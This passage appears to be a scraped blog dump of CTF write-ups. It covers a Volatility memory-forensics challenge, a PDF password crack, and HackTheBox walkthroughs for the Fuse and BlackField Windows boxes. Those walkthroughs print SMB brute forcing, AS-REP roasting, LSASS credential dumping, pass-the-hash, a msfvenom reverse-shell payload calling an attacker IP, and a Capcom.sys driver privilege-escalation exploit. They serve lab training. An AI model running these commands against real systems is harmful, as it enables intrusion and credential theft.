memory.mem --profile=Win7SP1x64 pstree | grep -C 3 wscript.exe Volatility Foundation Volatility Framework 2.6. 0xfffffa8004798320:calc.exe 3548 1432 3 77 2019-03-22 05:34:43 UTC+0000. 0xfffffa80053d3060:POWERPNT.EXE 4048 1432 23 765 2019-03-22 05:35:09 UTC+0000. 0xfffffa8004905620:hfs.exe 3952 1432 6 214 2019-03-22 05:34:51 UTC+0000.. 0xfffffa8005a80060:wscript.exe 5116 3952 8 312 2019-03-22 05:35:32 UTC+0000... 0xfffffa8005a1d9e0:UWkpjFjDzM.exe 3496 5116 5 109 2019-03-22 05:35:33 UTC+0000.... 0xfffffa8005bb0060:cmd.exe 4660 3496 1 33 2019-03-22 05:35:36 UTC+0000. 0xfffffa80054f9060:notepad.exe 3032 1432 1 60 2019-03-22 05:32:22 UTC+000 and we got the answer UWkpjFjDzM.exe Question 5:What was the IP address of the machine at the time the RAM dump was created?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solution:We have to find the ip address, using the plugin netscan kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 netscan | grep -v &#x27;127.0.0.1\\|0.0.0.0&#x27; Use grep to filter localhost ip address. The owner of system process svchost.exe seems bind to ip address 10.0.0.101:55736 which is the IP address when the RAM dump is created Question 6Based on the answer regarding to the infected PID, can you determine what the IP of the attacker was?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. SolutionGoing back to question 4 we found out the malicious process is UWkpjFjDzM.exe Still using the same netscan plugin,we find out thereâ€™s a connection to 10.0.0.106 port 4444 is one of the favorite port for malicious connection from hacker kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 netscan | grep UWkpjFjDzM.exe Volatility Foundation Volatility Framework 2.60x13e397190 TCPv4 10.0.0.101:49217 10.0.0.106:4444 ESTABLISHED 3496 UWkpjFjDzM.exe So the malicious hacker ip is 10.0.0.106 Question 7What process name is VCRUNTIME140.dll associated with?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. SolutionWe have to use the dlllist plugin kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 dlllist &gt; dlllist We find the keyword dll VCRUNTIME140.dll we found the malicious software OfficeClickToRun.exe However beware that the process name should be OfficeClickToR Question 8What is the md5 hash value the potential malware on the system?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solution :We are not able to identify the hash directly in memory dump. We have to use one of the volatility function Procdump At first I though the malicious process is OfficeClickToR but it appears to be UWkpjFjDzM.exe we found earlier one kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 procdump -p 3496 --dump-dir .Volatility Foundation Volatility Framework 2.6Process(V) ImageBase Name Result------------------ ------------------ -------------------- ------0xfffffa8005a1d9e0 0x0000000000400000 UWkpjFjDzM.exe OK: executable.3496.exe kali Desktop/forensic_images Â» md5sum executable.3496.exe 690ea20bc3bdfb328e23005d9a80c290 executable.3496.exe and we got the md5 hash Question 9What is the LM hash of bobs account?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solution :Use the hashdump plugin kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 hashdump Volatility Foundation Volatility Framework 2.6Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Bob:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: and we got bobâ€™s hash Question 10What protections does the VAD node at 0xfffffa800577ba10 have?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solutionsimple kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 vadinfo | grep -A 5 &#x27;0xfffffa800577ba10&#x27; 130 â†µVolatility Foundation Volatility Framework 2.6VAD node @ 0xfffffa800577ba10 Start 0x0000000000030000 End 0x0000000000033fff Tag Vad Flags: NoChange: 1, Protection: 1Protection: PAGE_READONLYVad Type: VadNoneControlArea @fffffa8005687a50 Segment fffff8a000c4f870NumberOfSectionReferences: 1 NumberOfPfnReferences: 0 The answer is PAGE_READONLY Question 11There was a VBS script run on the machine. What is the name of the script? (submit without file extension)Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solution:After some research find out that, wscript.exe is tasked with executing the VBScript files. [What is wscript.exe?]([https://www.file.net/process/wscript.exe.html#:~:text=The%20genuine%20wscript.exe%20file,any%20harm%20to%20your%20PC.](https://www.file.net/process/wscript.exe.html#:~:text=The genuine wscript.exe file,any harm to your PC.)) Hence, we can perform a memory dump on wscript.exe and use strings to identify which VBScripts file has been executed kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 memdump -p 5116 --dump-dir . 2 â†µVolatility Foundation Volatility Framework 2.6************************************************************************Writing wscript.exe [ 5116] to 5116.dmpkali Desktop/forensic_images Â» strings 5116.dmp| grep vbs &quot;C:\\Windows\\System32\\wscript.exe&quot; //B //NOLOGO %TEMP%\\vhjReUDEuumrX.vbs%TEMP%\\vhjReUDEuumrX.vbs%TEMP%\\vhjReUDEuumrX.vbsvbscript.dllvbscript.pdbvbscript.vbs.vbsx86_microsoft-windows-m..ents-mdac-ado15-vbs_31bf3856ad364e35_none_9360988f60461a77amd64_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_444030db0904e80bamd64_microsoft-windows-m..nts-mdac-rds-ce-vbs_31bf3856ad364e35_none_17691405728212bfamd64_microsoft-windows-scripting-vbscript_31bf3856ad364e35_none_1dd485790300b91fnx86_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_e821955750a776d5x86_microsoft-windows-m..nts-mdac-rds-ce-vbs_31bf3856ad364e35_none_bb4a7881ba24a189wow64_microsoft-windows-scripting-vbscript_31bf3856ad364e35_none_28292fcb37617b1aamd64_microsoft-windows-m..ents-mdac-ado15-vbs_31bf3856ad364e35_none_ef7f341318a38badvbscript.vbs.vbsx86_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_fc14ed9ab50fcbf0amd64_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_5833891e6d6d3d26version:1|.ade:3|.adp:3|.app:3|.asp:3|.bas:3|.bat:3|.bz:3|.bz2:3|.cer:3|.chm:3|.class:3|.cmd:3|.com:3|.command:3|.cpl:3|.crt:3|.csh:3|.desktop:3|.exe:3|.fxp:3|.gz:3|.hex:3|.hlp:3|.hqx:3|.hta:3|.inf:3|.ini:3|.ins:3|.isp:3|.its:3|.job:3|.js:3|.jse:3|.ksh:3|.lnk:3|.lzh:3|.mad:3|.maf:3|.mag:3|.mam:3|.maq:3|.mar:3|.mas:3|.mat:3|.mau:3|.mav:3|.maw:3|.mda:3|.mde:3|.mdt:3|.mdw:3|.mdz:3|.msc:3|.msi:3|.msp:3|.mst:3|.ocx:3|.ops:3|.pcd:3|.pi:3|.pif:3|.prf:3|.prg:3|.pst:3|.rar:3|.reg:3|.scf:3|.scr:3|.sct:3|.sea:3|.shb:3|.shs:3|.sit:3|.tar:3|.tgz:3|.tmp:3|.url:3|.vb:3|.vbe:3|.vbs:3|.vsmacros:3|.vss:3|.vst:3|.vsw:3|.webloc:3|.ws:3|.wsc:3|.wsf:3|.wsh:3|.zip:3|.zlo:3|.zoo:3|.pdf:2|.fdf:2version:1|shell:3|hcp:3|ms-help:3|ms-its:3|ms-itss:3|its:3|mk:3|mhtml:3|help:3|disk:3|afp:3|disks:3|telnet:3|ssh:3|javascript:1|vbscript:1|acrobat:2|mailto:2|file:2eventvwr.exegatherNetworkInfo.vbsslmgr.vbswinrm.vbsamd64_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_444030db0904e80b.vbsamd64_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_5833891e6d6d3d26x86_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_fc14ed9ab50fcbf0 The answer is vhjReUDEuumrX.vbs Question 12An application was run at 2019-03-07 23:06:58 UTC, what is the name of the program? (Include extension)Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. SolutionI have no clue at first, but manage to find the plugin shimache which indicates the timestamp Caching Out: The Value of Shimcache for Investigators kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 shimcache | grep &#x27;2019-03-07 23:06:58&#x27;Volatility Foundation Volatility Framework 2.62019-03-07 23:06:58 UTC+0000 \\??\\C:\\Program Files (x86)\\Microsoft\\Skype for Desktop\\Skype.exe We find out The skype application is running Question 13What was written in notepad.exe in the time of the memory dump?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solutionkali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 memdump -p 3032 --dump-dir .kali Desktop/forensic_images Â» strings -e l 3032.dmp | grep &quot;flag&lt;&quot;flag&lt;REDBULL_IS_LIFE&gt;flag&lt;Th&gt;flag&lt;Th&gt;flag&lt;TheK&gt;flag&lt;TheK&gt; The solution is straight forward, get the notepad memory dump and grep for the flag Question 14What is the shortname of the file at file record 59045?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://ik0nw.github.io/categories/CTF/"}],"tags":[{"name":"forensic","slug":"forensic","permalink":"https://ik0nw.github.io/tags/forensic/"}],"author":"Ikonw"},{"title":"HTB::Challenge [Misc] G0ld","slug":"Challenge-G0ld","date":"2020-08-14T22:29:33.000Z","updated":"2020-09-20T06:50:00.784Z","comments":true,"path":"2020/08/15/Challenge-G0ld/","permalink":"https://ik0nw.github.io/2020/08/15/Challenge-G0ld/","excerpt":"","text":"After extracted the file The pdf file is password protected. Search for pdf2john and we created the hash for john to cracked it. By using the rockyou dictionary, we are able to get the password john --wordlist=&lt;rockyou.txt&gt; &lt;pdf_hash&gt; we got the password jumanji69 after open the pdf, found morse code copy it and decode online we got the flag","categories":[{"name":"hackthebox-challenge","slug":"hackthebox-challenge","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/"},{"name":"misc","slug":"hackthebox-challenge/misc","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/misc/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Fuse Writeup","slug":"HTB-Fuse","date":"2020-06-15T00:00:00.000Z","updated":"2020-11-07T07:54:21.015Z","comments":true,"path":"2020/06/15/HTB-Fuse/","permalink":"https://ik0nw.github.io/2020/06/15/HTB-Fuse/","excerpt":"","text":"Author Ikonwnmap# Nmap 7.80 scan initiated Wed Sep 2 03:57:19 2020 as: nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49675,49676,49680,49698 -oN nmap/Full_10.10.10.193.nmap 10.10.10.193Nmap scan report for 10.10.10.193Host is up (0.0079s latency).PORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings: | DNSVersionBindReqTCP: | version|_ bind80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn&#x27;t have a title (text/html).88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-02 08:10:26Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049676/tcp open msrpc Microsoft Windows RPC49680/tcp open msrpc Microsoft Windows RPC49698/tcp open msrpc Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=9/2%Time=5F4F506B%P=x86_64-pc-linux-gnu%r(DNSVeSF:rsionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\xSF:04bind\\0\\0\\x10\\0\\x03&quot;);Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h33m00s, deviation: 4h02m32s, median: 12m58s| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Fuse| NetBIOS computer name: FUSE\\x00| Domain name: fabricorp.local| Forest name: fabricorp.local| FQDN: Fuse.fabricorp.local|_ System time: 2020-09-02T01:12:45-07:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2020-09-02T08:12:42|_ start_date: 2020-09-02T08:04:25Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Sep 2 04:01:52 2020 -- 1 IP address (1 host up) scanned in 273.40 seconds We get the FQDN from the smb-os-discovery script add it to the &#x2F;etc&#x2F;hosts I like to enumerate smb ports first â”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# enum4linux Fuse.fabricorp.localStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep 7 11:02:19 2020 However it didnt give me any critical information, anonymous login didnt get me anything too â”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# smbclient -L 10.10.10.193 Enter WORKGROUP\\root&#x27;s password: Anonymous login successful Sharename Type Comment --------- ---- -------SMB1 disabled -- no workgroup available Start investigate the web, itâ€™s a papercut CMS if im not wrong. Found some user in each print logs We collect all the user pmertontlavelsthompsonbhultadministrator According to previous box such as sauna. The entry point most likely is to collect user and password from the web server and brute force on smb ports. Therefore we use cewl to make a collection of password dictionary. cewl -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm -m3 --with-numbers Launch msfconsole use the smb_login module to bruteforce msf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE userUSER_FILE =&gt; usermsf5 auxiliary(scanner/smb/smb_login) &gt; set PASS_FILE wordlistPASS_FILE =&gt; wordlistmsf5 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10.10.10.193rhosts =&gt; 10.10.10.193msf5 auxiliary(scanner/smb/smb_login) &gt; set smbdomain fabricorp.localsmbdomain =&gt; fabricorp.localmsf5 auxiliary(scanner/smb/smb_login) &gt; run successfully got 2 creds [+] 10.10.10.193:445 - 10.10.10.193:445 - Success: &#x27;fabricorp.local\\tlavel:Fabricorp01&#x27;[+] 10.10.10.193:445 - 10.10.10.193:445 - Success: &#x27;fabricorp.local\\bhult:Fabricorp01&#x27; Trying login to smb server, but was prompt with error which I never meet. Both account have the same problem â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/fuse]â””â”€# smbclient -L 10.10.10.193 -U tlavel Enter WORKGROUP\\tlavel&#x27;s password: session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/fuse]â””â”€# smbclient -L 10.10.10.193 -U bhult Enter WORKGROUP\\bhult&#x27;s password: session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE After some google,find out I can use smbpasswd to change the password There seems some password policy, so I change the password to Fabricop011 for both accout â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/fuse]â””â”€# smbpasswd -r 10.10.10.193 -U tlavel Old SMB password:New SMB password:Retype new SMB password:Password changed for user tlavel on 10.10.10.193. After some enumeration on rpcclient and password $fab@s3Rv1ce$1 found some username rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[svc-print] rid:[0x450]user:[bnielson] rid:[0x451]user:[sthompson] rid:[0x641]user:[tlavel] rid:[0x642]user:[pmerton] rid:[0x643]user:[svc-scan] rid:[0x645]user:[bhult] rid:[0x1bbd]user:[dandrews] rid:[0x1bbe]user:[mberbatov] rid:[0x1db1]user:[astein] rid:[0x1db2]user:[dmuir] rid:[0x1db3] and one password rpcclient $&gt; enumprinters flags:[0x800000] name:[\\\\10.10.10.193\\HP-MFT01] description:[\\\\10.10.10.193\\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)] comment:[] and we try to login to windows using this credentials. Went back to to msfconsole, we lanuch win_rm module to brute force the username against the password and we got the creds svc-print:$fab@s3Rv1ce$1 use evil-winrm to login â”Œâ”€â”€(rootğŸ’€kali)-[/opt/evil-winrm]â””â”€# ./evil-winrm.rb -i 10.10.10.193 -u svc-print -p \\$fab@s3Rv1ce\\$1 1 â¨¯Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-print\\Documents&gt; dir*Evil-WinRM* PS C:\\Users\\svc-print\\Documents&gt; cd ..*Evil-WinRM* PS C:\\Users\\svc-print&gt; dir Directory: C:\\Users\\svc-printMode LastWriteTime Length Name---- ------------- ------ ----d-r--- 6/1/2020 1:45 AM Desktopd-r--- 5/31/2020 5:20 PM Documentsd-r--- 7/16/2016 6:18 AM Downloadsd-r--- 7/16/2016 6:18 AM Favoritesd-r--- 7/16/2016 6:18 AM Linksd-r--- 7/16/2016 6:18 AM Musicd-r--- 7/16/2016 6:18 AM Picturesd----- 7/16/2016 6:18 AM Saved Gamesd-r--- 7/16/2016 6:18 AM Videos*Evil-WinRM* PS C:\\Users\\svc-print&gt; cd Desktop*Evil-WinRM* PS C:\\Users\\svc-print\\Desktop&gt; dir Directory: C:\\Users\\svc-print\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 9/7/2020 12:35 AM 34 user.txt RootAfter getting root, check userâ€™s privilege PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled seLoadDrivePrivilege is enabled Abusing SeLoadDriverPrivilege for privilege escalation This site is a good reference for SeLoadDriverPrivilege escalation EopLoaddriver Capcom.sys ExploitCapcom open up the ExploitCapcom.cpp file, modify the Launch shell function. Change the commandLine[] targeted to a meterpreter.exe and compile it. Next we have to generate a meterpreter.exe msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.10 lport=1234 -f exe &gt; meterpreter.exe Create a folder called temp in C:\\ and upload all the 4 files to the target server. *Evil-WinRM* PS C:\\temp&gt; .\\EOPLOADDRIVER.exe System\\CurrentControlSet\\MyService C:\\temp\\capcom.sys[+] Enabling SeLoadDriverPrivilege[+] SeLoadDriverPrivilege Enabled[+] Loading Driver: \\Registry\\User\\S-1-5-21-2633719317-1471316042-3957863514-1104\\System\\CurrentControlSet\\MyServiceNTSTATUS: c000010e, WinError: 0*Evil-WinRM* PS C:\\temp&gt; .\\ExploitCapcom.exe[*] Capcom.sys exploit[*] Capcom.sys handle was obtained as 0000000000000080[*] Shellcode was placed at 000002841CC20008[+] Shellcode was executed[+] Token stealing was successful[+] The SYSTEM shell was launched[*] Press any key to exit this program And we got the meterpreter session on our multi handler","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"medium","slug":"medium","permalink":"https://ik0nw.github.io/tags/medium/"}]},{"title":"HTB BlackField Writeup","slug":"HTB-BlackField","date":"2020-06-10T00:00:00.000Z","updated":"2020-10-08T23:04:31.573Z","comments":true,"path":"2020/06/10/HTB-BlackField/","permalink":"https://ik0nw.github.io/2020/06/10/HTB-BlackField/","excerpt":"","text":"Author: IkonwNmap Scan:Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 20:09 +08Nmap scan report for 10.10.10.192Host is up (0.0074s latency).PORT STATE SERVICE VERSION88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-07 19:09:38Z)135/tcp open msrpc Microsoft Windows RPC139/tcp filtered netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.03268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 6h59m59s| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2020-09-07T19:09:47|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 51.59 seconds Launch smbmap login using anonymous account, found 2 files we can read â”Œâ”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator]â””â”€# smbmap -H 10.10.10.192 -u anonymous 2 â¨¯[+] Guest session IP: 10.10.10.192:445 Name: 10.10.10.192 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic NO ACCESS Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON NO ACCESS Logon server share profiles$ READ ONLY SYSVOL NO ACCESS Logon server share Access to profiles$ We found tons of user name, use along with awk command we collect the usernames smbclient \\\\\\\\10.10.10.192\\\\profiles$ -c ls | awk &#x27;&#123;print $1&#125;&#x27; &gt; user.lst Launch the impacket tool GetNPUsers.py â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/blackfield]â””â”€# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -no-pass -usersfile user.lst | grep -v &quot;not found&quot;Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation[-] User audit2020 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$support@BLACKFIELD.LOCAL:d3f58a3eb5d36dc74f2c4a4335a5ce3e$06ce4ccf78e620d6e2e9994bd546f519cabec98dd1879365456bcee2081d7f0579d8e6b20d7b0e5750c533de72b48404ad38bf2241acc01cdf9e1868717cb01142ab131ebda7de2a0916a141ba5b1fd1b8e0895833ea57ce4b01cd93900eba7c4bab1e1a8dfcdb471486fedc1f731b5e65f38219e37883274350288d916e18f43359a170dd9aa3ef22d53c399378ed3467467211d6be448ee73983abe6cf7998725bfa70b7de45969715c15417af5249ebe9dd16332222f17101bbb1bdbfc2d32ac2bc319302911973a88a2b67fd425092e0f31329d04fd9eca106a97f2265185f6ae6c8ca8e747272dcad410bfbedac0275ed12[-] User svc_backup doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] invalid principal syntax Save the hash and use john to crack it. We got the creds support:#00^BlackKnight â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/blackfield]â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt user_hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])Will run 4 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status#00^BlackKnight ($krb5asrep$23$support@BLACKFIELD.LOCAL)1g 0:00:00:16 DONE (2020-09-07 21:30) 0.06203g/s 889266p/s 889266c/s 889266C/s #1ByNature..#*burberry#*1990Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed Try login using winrm port, but it failed. Letâ€™s go back to use new credentials to smb server â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/blackfield]â””â”€# smbmap -H 10.10.10.192 -u support -p &quot;#00^BlackKnight&quot; 2 â¨¯[+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic NO ACCESS Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share profiles$ READ ONLY SYSVOL READ ONLY Logon server share Found nothing interesting use rpcclient connect to rpc rpcclient -U blackfield.local\\\\support 10.10.10.192rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[audit2020] rid:[0x44f]user:[support] rid:[0x450]user:[BLACKFIELD764430] rid:[0x451]user:[BLACKFIELD538365] rid:[0x452]user:[BLACKFIELD189208] rid:[0x453]user:[BLACKFIELD404458] rid:[0x454]user:[BLACKFIELD706381] rid:[0x455]user:[BLACKFIELD937395] rid:[0x456]........................... We got tons of user again. After research, nothing special. But came along with a article using rpc to reset domain user password Reset AD User password with Linux Make a change to user audit2020 password to Ikonw123! rpcclient $&gt; setuserinfo2Usage: setuserinfo2 username level password [password_expired]result was NT_STATUS_INVALID_PARAMETERrpcclient $&gt; setuserinfo2 audit2020 23 Ikonw123! Sadly, we still not able login using winrm but we can access audit2020â€˜s smb share again. yeah smb share againnnn. This time round, forensic folder is available to us â”Œâ”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator/10.10.10.192/nmap]â””â”€# smbmap -H 10.10.10.192 -u audit2020 -p Ikonw123![+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic READ ONLY Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share profiles$ READ ONLY SYSVOL READ ONLY Logon server share â”Œâ”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator/10.10.10.192/nmap]â””â”€# smbclient \\\\\\\\10.10.10.192\\\\forensic -U audit2020 Enter WORKGROUP\\audit2020&#x27;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Sun Feb 23 21:03:16 2020 .. D 0 Sun Feb 23 21:03:16 2020 commands_output D 0 Mon Feb 24 02:14:37 2020 memory_analysis D 0 Fri May 29 04:28:33 2020 tools D 0 Sun Feb 23 21:39:08 2020 7846143 blocks of size 4096. 3978511 blocks availablesmb: \\&gt; Alright, it seems tons of files. Download the folder to local (If your internet connection is slow, you might also consider just mount the smb directory to local) recurse ONprompt OFFmget * A DMP file is a file that contains data â€œdumpedâ€ from a programâ€™s memory space. It is often created when a program has an error or crashes and may also be saved by the program â€œSavedump.exeâ€ on the first reboot after a crash. DMP files are usually named â€œMemory.dmp.â€ pypykatz has the ability to parse the secrets hidden in the LSASS process, it is just something like mimikatzâ€™s sekurlsa:: pypykatz lsa minidump lsass.DMP and we actually got the password hash for user svc_backup == MSV == Username: svc_backup Domain: BLACKFIELD LM: NA NT: 9658d1d1dcd9250115e2205d9f48400d SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c No need to bruteforce, we can directly pass the hash using evil-winrm â”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator/10.10.10.192/nmap/memory_analysis]â””â”€# evil-winrm.rb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192 Privilege escalationAfter checking the userâ€™s privileges, found out that SeBackupPrivilege is enabled. SeBackupPrivilegeDescription: This privilege causes the system to grant all read access control to any file, regardless of the access control list (ACL) specified for the file. Firstly, I tried the vssadmin, well I donâ€™t have the privilege *Evil-WinRM* PS C:\\Users&gt; vssadmin create shadow /for=C:vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool(C) Copyright 2001-2013 Microsoft Corp.Error: You don&#x27;t have the correct permissions to run this command. Please run this utility from a commandwindow that has elevated administrator privileges. Members of â€œBackup Operatorsâ€ can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: â€œwbadmin.exeâ€ or â€œdiskshadow.exe As I read carefully, found out that diskshadow allow us to create a new shadow disk copy of the disk C and expose it as another driver shadow_copy.txt set context persistent nowritersadd volume c: alias ikonwcreateexpose %ikonw% z: However it has error -&gt; set context persistent nowriter &lt;&lt;--- shudnt it be nowriters?SET CONTEXT &#123; CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] &#125; CLIENTACCESSIBLE Specify to create shadow copies usable by client versions of Windows. PERSISTENT Specify that shadow copy is persist across program exit, reset or reboot. PERSISTENT NOWRITERS Specify that shadow copy is persistent and all writers are excluded. VOLATILE Specify that shadow copy will be deleted on exit or reset. VOLATILE NOWRITERS Specify that shadow copy is volatile and all writers are excluded. Example: SET CONTEXT 